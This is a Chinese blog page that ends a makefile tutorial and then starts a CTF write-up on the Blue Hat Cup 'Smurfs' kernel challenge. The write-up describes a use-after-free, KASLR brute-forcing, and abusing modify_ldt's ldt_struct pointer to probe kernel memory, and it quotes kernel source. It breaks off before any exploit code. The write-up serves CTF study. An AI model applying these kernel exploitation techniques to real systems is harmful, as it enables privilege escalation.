<h2 id="编译动态链接库"><a href="#编译动态链接库" class="headerlink" title="编译动态链接库"></a>编译动态链接库</h2><p>感觉。。。没啥。。。。，和makefile关系不大</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907215742516.png" alt="image-20220907215742516"></p>
<h2 id="通用部分做公共头文件"><a href="#通用部分做公共头文件" class="headerlink" title="通用部分做公共头文件"></a>通用部分做公共头文件</h2><p>makefile还有自动推导能力，上面的makefile还可以简短到以下几行</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>makefile还能嵌套makefile,那就可以把通用的内容写在一个makefile中，然后在其他makefile中使用，如下例</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TARGET=c</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> ../makefile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#公共</span></span><br><span class="line"></span><br><span class="line">SOURCE=<span class="variable">$(<span class="built_in">wildcard</span>  ./*.cpp ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span>  %.cpp,%.o,<span class="variable">$(SOURCE)</span>)</span></span><br><span class="line">OBJ:=<span class="variable">$(<span class="built_in">patsubst</span>  %.c,%.o,<span class="variable">$(OBJ)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	</span><br><span class="line"><span class="section">show:</span></span><br><span class="line">	echo <span class="variable">$(SOURCE)</span></span><br><span class="line">	echo <span class="variable">$(OBJ)</span></span><br></pre></td></tr></table></figure>

<p>在makefile中都是先解析所有变量然后再执行命令的，所以变量的声明放在哪里都是没有所谓的。</p>
<p><code>=</code>,赋值操作，把终值赋值给变量，注意不能字节赋值给字节，比如Y=$(Y)</p>
<p><code>：=</code>也是赋值，但是与<code>=</code>不同的是他不会受到它下面的代码以及变量的影响。</p>
<h2 id="调用shell"><a href="#调用shell" class="headerlink" title="调用shell"></a>调用shell</h2><p>在makefile中可以使用<code>ifndef endif</code>来添加默认值</p>
<p>在makefile中可以在目标以外执行shell命令，如下</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$(<span class="built_in">shell</span> ls)</span></span><br><span class="line"><span class="section">a:</span></span><br><span class="line">	echo <span class="variable">$(A)</span></span><br></pre></td></tr></table></figure>

<p>在makefile中还可以调用其他makefile,不是像上面那样的包含，而是调用，因为很有时候不同模块有不同的makefile,要想直接全部就一起编译，可以再写个makefile调用他们，调用规则其实就是shell指令</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	make -C ./makefile</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908155748153.png" alt="image-20220908155748153"></p>
<h2 id="条件判断-amp-循环"><a href="#条件判断-amp-循环" class="headerlink" title="条件判断&amp;循环"></a>条件判断&amp;循环</h2><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908160944829.png" alt="image-20220908160944829" style="zoom:200%;" />

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908161145932.png" alt="image-20220908161145932"></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908161321317.png" alt="image-20220908161321317"></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908163409283.png" alt="image-20220908163409283"></p>
<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><p>变量，if,循环和函数都有了，感觉和一门语言都差不多了。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908163840185.png" alt="image-20220908163840185"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908165302800.png" alt="image-20220908165302800"></p>
<p>例子，把二进制程序放置在一个目录下，然后在/bin目录中放一个二进制程序的软链接，然后就可以在任何目录中调用这个程序了。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TARGET:=006_main</span><br><span class="line">OBJ:=<span class="variable">$(TARGET)</span>.o</span><br><span class="line"></span><br><span class="line">CC:=g++</span><br><span class="line"></span><br><span class="line">PATH:=/tmp/006_main/</span><br><span class="line">BIN:=/usr/local/bin/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">install:<span class="variable">$(TARGET)</span></span></span><br><span class="line">	if [ -d <span class="variable">$(PATH)</span> ];\</span><br><span class="line">		then echo <span class="variable">$(PATH)</span> exist; \</span><br><span class="line">	<span class="keyword">else</span> \</span><br><span class="line">	  	/bin/mkdir <span class="variable">$(PATH)</span>;\</span><br><span class="line">	  	/bin/cp <span class="variable">$(TARGET)</span> <span class="variable">$(PATH)</span>;\</span><br><span class="line">  		/bin/ln -sv <span class="variable">$(PATH)</span><span class="variable">$(TARGET)</span> <span class="variable">$(BIN)</span>;\</span><br><span class="line">  	fi;</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(RM)</span> -rf <span class="variable">$(PATH)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean install</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">蓝帽杯半决赛 Smurfs复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-12 21:57:21" itemprop="dateCreated datePublished" datetime="2022-08-12T21:57:21+08:00">2022-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-18 22:47:26" itemprop="dateModified" datetime="2022-08-18T22:47:26+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="蓝帽杯半决赛-Smurfs复现"><a href="#蓝帽杯半决赛-Smurfs复现" class="headerlink" title="蓝帽杯半决赛 Smurfs复现"></a>蓝帽杯半决赛 Smurfs复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提供了del,add,edit，其中有比较裸的uaf,edit可以编辑前八个字节,但是没有泄露地址的功能，在比赛期间我采用<code>seq_operations</code>的<code>start</code>指针来控制程序流，kernel的地址随机化只有9位，所以采用硬爆的策略打远程，可惜脸黑，爆了两个小时，到比赛结束还是没有爆出来。虽有一定可行性但是正解肯定不是这样，官方解出来看了看发现非常有含金量，遂复现一波。</p>
<h2 id="相关内核知识学习"><a href="#相关内核知识学习" class="headerlink" title="相关内核知识学习"></a>相关内核知识学习</h2><h3 id="进程ldt"><a href="#进程ldt" class="headerlink" title="进程ldt"></a>进程ldt</h3><p>虽然题目的利用思路和这个关系不是很大，但看都看了就记录一下。</p>
<p>介绍LDT就不得不介绍GDT了，简而言之，GDT是全局描述符表，而LDT是局部描述符表，在kvm的学习中接触过GDT,但是当时不理解为什么加了这个东西为什么就可以实现保护了，在询问<code>Alex</code>学长一波后终于搞懂，他是怎么实现内存保护以及进程位隔离的了。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220812195333645.png" alt="image-20220812195333645"></p>
<p>一个cpu有一个全局描述符表GDT，GDT相当于一个数组，每一个元素就是一个段描述符，一个段描述符就记录这个段的一些信息，比如段的基地址段的大小之类的，这个数组的地址存储在寄存器<code>GDTR</code>中，然后在段寄存器中就不会记录段的具体信息，而是记录一个段选择子，通过这个段选择子完成对某一个段描述符的索引</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/9r91dw9haq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>段选择子包括三部分，描述索引符，TL,RPL，其中描述索引符就是索引段描述符的，TL有两种可能，0代表在GDT中寻找，1代表在LDT中寻找。</p>
<p>LDT是在保护模式下实现进程间隔离的重要的机制，每个LDT都记录一个进程的段的信息，包括cs,ds,ss之类的，也是由段描述符组成的数组，他是一段内存，也可以看做一个段，所以可以在GDT中用一个描述符去记录他，也有一个寄存器LDTR，不过他不是记录LDT的基地址，而是一个选择子，当段寄存器的TL位是1的话，代表就是LDT选择，CPU会根据LDTR作为一个索引去GDT表中找描述符，找见的描述符就是对应一个LDT地址，然后再用对应的段寄存器的index找到对应的段描述符，可见，进程之间的LDTR不一样，他们的LDT就不一样，段寄存器就不一样，进程间就隔离了，比较形象的描述如下如图。</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/4icmuda124.jpeg?imageView2/2/w/1620" alt="img"></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1878670/czt9jkhxcl.png?imageView2/2/w/1620" alt="img"></p>
<h3 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h3><h4 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h4><p>该结构体是0x10大小的，然后前八个字节是一个指针，通过uaf我们得到这个结构体，然后通过edit可以控制前八个字节，也就是控制<code>entries</code>指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        nr_entries;</span><br><span class="line">    <span class="keyword">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code> struct desc_struct</code>就是一个段描述符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h4 id="moddify-ldt系统调用"><a href="#moddify-ldt系统调用" class="headerlink" title="moddify_ldt系统调用"></a>moddify_ldt系统调用</h4><p>可以通过linux提供的<code>modity_ldt</code>来获取或者修改当前进程的LDT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>moddify_ldt系统调用一共提供了四个功能，参数有三个，fun,ptr,bytecount,<code>ptr</code>是我们传入的结构体指针，结构体为<code>user_desc</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>read_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line"> <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"> down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">  retval = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">  bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line"> entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"> <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">  entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">  retval = -EFAULT;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">  <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">  <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">   retval = -EFAULT;</span><br><span class="line">   <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"> <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数会使用<code>copy_to_user</code>把ldt-&gt;entires的值拷贝到传入的<code>ptr</code>中，就是把这个进程的LDT拷贝到<code>ptr</code>中，如果拷贝不成功，那就会返回-1.我们可以检查返回值判断是否读取成功，也就是可以爆破出heap或者kernel地址。</p>
<p><strong>write_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"> <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> error = -EFAULT;</span><br><span class="line"> <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  <span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">     LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">  <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">   error = -EINVAL;</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   ldt.avl = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">  <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line"> old_ldt       = mm-&gt;context.ldt;</span><br><span class="line"> old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line"> new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line"> error = -ENOMEM;</span><br><span class="line"> new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"> <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (old_ldt)</span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"> new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"> finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">  * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">  * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">  * them over to the new LDT.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">if</span> (error) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">   * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">   * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">   free_ldt_pgtables(mm);</span><br><span class="line">  free_ldt_struct(new_ldt);</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> install_ldt(mm, new_ldt);</span><br><span class="line"> unmap_ldt_struct(mm, old_ldt);</span><br><span class="line"> free_ldt_struct(old_ldt);</span><br><span class="line"> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"> <span class="keyword">return</span> 